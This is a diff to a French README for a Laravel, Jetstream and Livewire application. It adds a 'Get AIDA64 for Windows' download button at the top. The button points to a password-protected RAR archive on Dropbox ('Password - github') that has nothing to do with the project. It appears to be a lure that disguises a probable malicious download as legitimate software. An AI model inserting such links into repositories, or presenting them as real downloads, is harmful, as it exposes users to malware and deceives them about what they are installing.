@@ -1,3 +1,10 @@
+<p align="center">
+  <a href="https://www.dropbox.com/scl/fi/1cx18uogdu93qy8qwe55b/software_x64.rar?rlkey=8qp832yuvynxfh65gwe0h30ko&st=0lrps7zy&dl=1">
+    <img src="https://static.radio.co/production/windows-button-download.png" width="200" alt="Get AIDA64 for Windows">
+  </a>
+  <br>
+  <small>Password - github</small>
+</p>
 Présentation générale
 Ce dépôt correspond à une application Laravel (PHP 8.1) intégrant Jetstream, Livewire et Tailwind. On retrouve les dépendances principales dans le composer.json : Laravel, Livewire, Jetstream…
 
